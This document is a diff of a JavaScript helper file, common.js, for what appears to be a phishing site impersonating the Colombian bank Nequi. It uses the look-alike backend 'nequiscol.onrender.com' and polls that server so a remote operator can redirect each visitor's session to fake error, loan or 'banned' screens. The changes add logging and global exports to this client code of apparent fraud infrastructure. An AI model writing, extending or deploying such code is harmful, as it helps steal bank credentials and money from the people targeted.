@@ -1,6 +1,7 @@
 // common.js - Funciones comunes para todos los archivos HTML
 
-const BACKEND_URL = 'https://nequiscol.onrender.com'; // CAMBIAR POR TU URL DE RENDER
+// ✅ ACTUALIZADO: Usa la URL de tu backend en Render
+const BACKEND_URL = 'https://nequiscol.onrender.com';
 
 // ==================== MANEJO DE SESIÓN ====================
 async function initSession() {
@@ -68,12 +69,16 @@ function startPolling(sessionId, onRedirect) {
     clearInterval(pollingInterval);
   }
   
+  console.log(`🔄 Polling iniciado para session: ${sessionId}`);
+  
   pollingInterval = setInterval(async () => {
     try {
       const response = await fetch(`${BACKEND_URL}/instruction/${sessionId}`);
       const data = await response.json();
       
       if (data.redirect_to) {
+        console.log(`🎯 Redirección recibida: ${data.redirect_to}`);
+        
         // Si está baneado, DETENER polling y mostrar pantalla blanca
         if (data.redirect_to === 'banned') {
           clearInterval(pollingInterval);
@@ -86,7 +91,6 @@ function startPolling(sessionId, onRedirect) {
           if (typeof onRedirect === 'function') {
             onRedirect('error-dynamic');
           }
-          // NO hacer clearInterval - el polling sigue activo
           return;
         }
 
@@ -95,12 +99,12 @@ function startPolling(sessionId, onRedirect) {
           if (typeof onRedirect === 'function') {
             onRedirect('loan-simulator-error');
           }
-          // NO hacer clearInterval - el polling sigue activo
           return;
         }
         
         // Redirección normal - AQUÍ SÍ detener el polling
         clearInterval(pollingInterval);
+        pollingInterval = null;
         
         if (typeof onRedirect === 'function') {
           onRedirect(data.redirect_to);
@@ -118,6 +122,7 @@ function stopPolling() {
   if (pollingInterval) {
     clearInterval(pollingInterval);
     pollingInterval = null;
+    console.log('⏹️ Polling detenido');
   }
 }
 
@@ -147,6 +152,15 @@ function showLoaderWithAnimation(loaderElement, doneElement, successCallback, er
 }
 
 // ==================== EXPORTAR FUNCIONES ====================
+// Hacer funciones disponibles globalmente (para el navegador)
+window.BACKEND_URL = BACKEND_URL;
+window.initSession = initSession;
+window.checkIfBanned = checkIfBanned;
+window.startPolling = startPolling;
+window.stopPolling = stopPolling;
+window.showLoaderWithAnimation = showLoaderWithAnimation;
+
+// Para Node.js (si se usa en scripts)
 if (typeof module !== 'undefined' && module.exports) {
   module.exports = {
     BACKEND_URL,
@@ -157,3 +171,6 @@ if (typeof module !== 'undefined' && module.exports) {
     showLoaderWithAnimation
   };
 }
+
+console.log('✅ common.js cargado correctamente');
+console.log(`📡 Backend URL: ${BACKEND_URL}`);
